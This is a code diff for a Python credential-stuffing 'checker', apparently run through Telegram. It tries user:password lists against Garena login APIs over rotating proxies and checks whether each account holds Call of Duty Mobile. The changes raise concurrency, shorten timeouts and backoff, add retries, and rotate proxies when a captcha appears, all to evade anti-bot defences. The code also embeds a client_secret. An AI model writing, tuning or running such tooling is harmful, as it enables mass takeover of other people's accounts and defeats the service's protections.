@@ -96,13 +96,13 @@ _deletekey_selection: dict = {}  # chat_id -> set of key strings
 # ══════════════════════════════════════════════════════════════
 
 # Hard cap on total checker threads across ALL users at once
-MAX_GLOBAL_THREADS   = 20     # increased for Railway — handles more concurrent work
+MAX_GLOBAL_THREADS   = 30     # increased for Railway — handles more concurrent work
 # Threads per individual user (limits one user hogging everything)
-MAX_THREADS_PER_USER = 5      # 5 threads per user — fast & stable
+MAX_THREADS_PER_USER = 8      # 8 threads per user — faster checking
 # Max users running the checker simultaneously
 MAX_CONCURRENT_USERS = 10     # 10 users supported concurrently
 # VIP users get higher thread count for faster checking
-VIP_THREADS_PER_USER = 5      # VIP users: 5 threads (same cap, priority scheduling)
+VIP_THREADS_PER_USER = 10     # VIP users: 10 threads — priority scheduling
 
 # Global semaphore — enforces MAX_GLOBAL_THREADS hard cap
 _global_thread_sem = threading.Semaphore(MAX_GLOBAL_THREADS)
@@ -159,8 +159,8 @@ def _get_proxy_files():
 
 PROXY_FILES = _get_proxy_files()
 
-def backoff(attempt: int, base: float = 0.03, cap: float = 0.2) -> None:
-    """Ultra-fast exponential backoff: 0.03s → 0.06s → 0.12s → 0.2s (capped)."""
+def backoff(attempt: int, base: float = 0.02, cap: float = 0.15) -> None:
+    """Ultra-fast exponential backoff: 0.02s → 0.04s → 0.08s → 0.15s (capped)."""
     delay = min(base * (2 ** attempt), cap)
     time.sleep(delay)
 
@@ -1212,7 +1212,7 @@ def get_datadome_cookie(session):
     try:
         # Use session (which has the thread's proxy set) instead of bare requests
         # This ensures datadome is fetched through the same proxy as the thread
-        response = session.post(url, headers=headers, data=data, timeout=8)
+        response = session.post(url, headers=headers, data=data, timeout=6)
         response.raise_for_status()
         response_json = response.json()
         
@@ -1243,7 +1243,7 @@ def prelogin(session, account, datadome_manager, telegram_config=None):
         'id': str(int(time.time() * 1000))
     }
     
-    retries = 2  # reduced to lower VPS load
+    retries = 3  # 3 retries for better accuracy
     for attempt in range(retries):
         try:
             current_cookies = session.cookies.get_dict()
@@ -1277,7 +1277,7 @@ def prelogin(session, account, datadome_manager, telegram_config=None):
             if attempt > 0:
                 logger.info(f"      🔄 Retry {attempt + 1}/{retries}")
             
-            response = session.get(url, headers=headers, params=params, timeout=8)
+            response = session.get(url, headers=headers, params=params, timeout=6)
             
             new_cookies = {}
             
@@ -1314,7 +1314,7 @@ def prelogin(session, account, datadome_manager, telegram_config=None):
                 logger.error(f"      🚫 Access denied (403)")
                 logger.error(f"      🛡️ Security check triggered")
                 
-                if new_cookies and attempt < retries - 2:
+                if new_cookies and attempt < retries - 1:
                     logger.info(f"      🔄 Retrying with new cookies...")
                     backoff(attempt)
                     continue
@@ -1324,11 +1324,6 @@ def prelogin(session, account, datadome_manager, telegram_config=None):
                 else:
                     logger.error(f"      🚨 IP blocked - cannot continue")
                     return None, None, new_datadome
-                
-                if attempt < retries - 2:
-                    backoff(attempt)
-                    continue
-                return None, None, new_datadome
             
             response.raise_for_status()
             
@@ -1381,7 +1376,7 @@ def prelogin(session, account, datadome_manager, telegram_config=None):
                                 except Exception as ex:
                                     pass
                     
-                    if new_cookies and attempt < retries - 2:
+                    if new_cookies and attempt < retries - 1:
                         logger.info(f"      🔄 Retrying with new cookies...")
                         backoff(attempt)
                         continue
@@ -1391,11 +1386,6 @@ def prelogin(session, account, datadome_manager, telegram_config=None):
                     else:
                         logger.error(f"      🚨 IP blocked - cannot continue")
                         return None, None, new_cookies.get('datadome')
-                        
-                    if attempt < retries - 2:
-                        backoff(attempt)
-                        continue
-                    return None, None, new_cookies.get('datadome')
                 else:
                     logger.error(f"      ✘ HTTP {e.response.status_code}")
                     logger.error(f"      🖥️ Server error")
@@ -1454,10 +1444,10 @@ def login(session, account, password, v1, v2):
     if cookie_header:
         headers['cookie'] = cookie_header
     
-    retries = 2  # reduced to lower VPS load
+    retries = 3  # 3 retries for better accuracy on login
     for attempt in range(retries):
         try:
-            response = session.get(url, headers=headers, params=params, timeout=8)
+            response = session.get(url, headers=headers, params=params, timeout=6)
             response.raise_for_status()
             
             login_cookies = {}
@@ -1505,8 +1495,10 @@ def login(session, account, password, v1, v2):
                     logger.warning(f"         └─ 🔑 Reason: {error_msg}")
                     return None
                 elif 'captcha' in error_msg.lower():
-                    logger.warning(f"     ✘ Login failed: Captcha required")
+                    logger.warning(f"     ✘ Login failed: Captcha required — rotating proxy")
                     logger.warning(f"         └─ 🤖 Reason: {error_msg}")
+                    geo_rotator.force_rotate()
+                    session.proxies.update(geo_rotator.get_proxies())
                     backoff(attempt)
                     continue
                 else:
@@ -1557,7 +1549,7 @@ def get_codm_access_token(session):
         device_id = f'02-{str(uuid.uuid4())}'
         grant_data = f'client_id=100082&redirect_uri=gop100082%3A%2F%2Fauth%2F&response_type=code&id={random_id}'
         
-        grant_response = session.post(grant_url, headers=grant_headers, data=grant_data, timeout=10)
+        grant_response = session.post(grant_url, headers=grant_headers, data=grant_data, timeout=7)
         grant_json = grant_response.json()
         auth_code = grant_json.get('code', '')
         
@@ -1575,7 +1567,7 @@ def get_codm_access_token(session):
         
         token_data = f'grant_type=authorization_code&code={auth_code}&device_id={device_id}&redirect_uri=gop100082%3A%2F%2Fauth%2F&source=2&client_id=100082&client_secret=388066813c7cda8d51c1a70b0f6050b991986326fcfb0cb3bf2287e861cfa415'
         
-        token_response = session.post(token_url, headers=token_headers, data=token_data, timeout=10)
+        token_response = session.post(token_url, headers=token_headers, data=token_data, timeout=7)
         token_json = token_response.json()
         
         access_token = token_json.get('access_token', '')
@@ -1599,7 +1591,7 @@ def process_codm_callback(session, access_token, open_id=None, uid=None):
             'referer': 'https://auth.garena.com/'
         }
         
-        old_response = session.get(old_callback_url, headers=old_headers, allow_redirects=False, timeout=10)
+        old_response = session.get(old_callback_url, headers=old_headers, allow_redirects=False, timeout=7)
         location = old_response.headers.get('Location', '')
         
         if 'err=3' in location:
@@ -1617,7 +1609,7 @@ def process_codm_callback(session, access_token, open_id=None, uid=None):
             'x-requested-with': 'com.garena.game.codm'
         }
         
-        aos_response = session.get(aos_callback_url, headers=aos_headers, allow_redirects=False, timeout=10)
+        aos_response = session.get(aos_callback_url, headers=aos_headers, allow_redirects=False, timeout=7)
         aos_location = aos_response.headers.get('Location', '')
         
         if 'err=3' in aos_location:
@@ -1666,7 +1658,7 @@ def get_codm_user_info(session, token):
             'x-requested-with': 'com.garena.game.codm'
         }
         
-        response = session.get(url, headers=headers, timeout=10)
+        response = session.get(url, headers=headers, timeout=7)
         data = response.json()
         user_data = data.get('user', {})
         
@@ -1687,30 +1679,44 @@ def get_codm_user_info(session, token):
         return {}
 
 def check_codm_account(session, account):
-    """Check if account has CODM"""
+    """Check if account has CODM — retries once on transient failures."""
     codm_info = {}
     has_codm = False
-    try:
-        access_token, open_id, uid = get_codm_access_token(session)
-        if not access_token:
-            logger.warning('      └─ ⚠️ No CODM access token')
-            return (has_codm, codm_info)
-        else:
+    for codm_attempt in range(2):  # retry once on failure
+        try:
+            access_token, open_id, uid = get_codm_access_token(session)
+            if not access_token:
+                if codm_attempt == 0:
+                    logger.debug('      └─ ⚠️ No CODM access token — retrying...')
+                    backoff(0)
+                    continue
+                logger.warning('      └─ ⚠️ No CODM access token')
+                return (has_codm, codm_info)
+
             codm_token, status = process_codm_callback(session, access_token, open_id, uid)
             if status == 'no_codm':
                 logger.info('      └─ 📭 No CODM detected')
                 return (has_codm, codm_info)
-            else:
-                if status != 'success' or not codm_token:
-                    logger.warning(f'      └─ ⚠️ CODM callback failed: {status}')
-                    return (has_codm, codm_info)
-                else:
-                    codm_info = get_codm_user_info(session, codm_token)
-                    if codm_info:
-                        has_codm = True
-                        logger.info(f"      └─ 🎮 CODM detected: Level {codm_info.get('codm_level', 'N/A')}")
-    except Exception as e:
-        logger.error(f'      └─ ✘ Error checking CODM: {e}')
+
+            if status != 'success' or not codm_token:
+                if codm_attempt == 0:
+                    logger.debug(f'      └─ ⚠️ CODM callback failed: {status} — retrying...')
+                    backoff(0)
+                    continue
+                logger.warning(f'      └─ ⚠️ CODM callback failed: {status}')
+                return (has_codm, codm_info)
+
+            codm_info = get_codm_user_info(session, codm_token)
+            if codm_info:
+                has_codm = True
+                logger.info(f"      └─ 🎮 CODM detected: Level {codm_info.get('codm_level', 'N/A')}")
+            return (has_codm, codm_info)
+        except Exception as e:
+            if codm_attempt == 0:
+                logger.debug(f'      └─ ✘ Error checking CODM: {e} — retrying...')
+                backoff(0)
+                continue
+            logger.error(f'      └─ ✘ Error checking CODM: {e}')
     return (has_codm, codm_info)
 
 def display_codm_info(account_details, codm_info):
@@ -2093,14 +2099,13 @@ def processaccount(session, account, password, cookie_manager, datadome_manager,
             if cookie_header:
                 headers['cookie'] = cookie_header
 
-            response = session.get('https://account.garena.com/api/account/init', headers=headers, timeout=10)
+            response = session.get('https://account.garena.com/api/account/init', headers=headers, timeout=7)
 
             if response.status_code == 403:
                 logger.warning(f"[INIT] 403 on account/init attempt {init_attempt + 1}/4")
                 if datadome_manager.handle_403(session, telegram_config=telegram_config):
-                    # Rotated and got new datadome — wait then retry the init request
                     logger.info(f"[INIT] Proxy rotated — retrying account/init...")
-                    time.sleep(0.02 + init_attempt * 0.02)
+                    time.sleep(0.01 + init_attempt * 0.01)
                     session.proxies.update(geo_rotator.get_proxies())
                     continue
                 else:
@@ -2633,8 +2638,8 @@ def create_thread_session(cookie_manager, datadome_manager):
     sess = cloudscraper.create_scraper()
     # ── Optimised adapter: max pooling for speed ────────────────
     adapter = requests.adapters.HTTPAdapter(
-        pool_connections=8,
-        pool_maxsize=20,      # max parallel connections pooled = fewer reconnects
+        pool_connections=12,
+        pool_maxsize=30,      # max parallel connections pooled = fewer reconnects
         max_retries=1,        # one retry for transient failures
     )
     sess.mount("http://",  adapter)
@@ -3944,8 +3949,6 @@ def _run_checker_for_file(filepath: str, telegram_config: tuple, chat_id=None, l
 
     def get_session():
         if not hasattr(thread_local, "session"):
-            # Stagger startups without holding a lock
-            time.sleep(0.01)
             dm = DataDomeManager()
             thread_local.session = create_thread_session(cookie_manager, dm)
             thread_local.dm      = dm
@@ -3970,12 +3973,11 @@ def _run_checker_for_file(filepath: str, telegram_config: tuple, chat_id=None, l
             if shutdown_event.is_set(): return
             user, pwd = line.split(":", 1)
             sess, dm  = get_session()
-            # no delay — maximum speed
             processaccount(sess, user.strip(), pwd.strip(),
                            cookie_manager, dm, live_stats,
                            result_folder, telegram_config=telegram_config)
-        except Exception:
-            pass
+        except Exception as e:
+            logger.debug(f"[CHECKER] Error on account #{i}: {str(e)[:80]}")
         finally:
             _global_thread_sem.release()
             with _bars_lock:
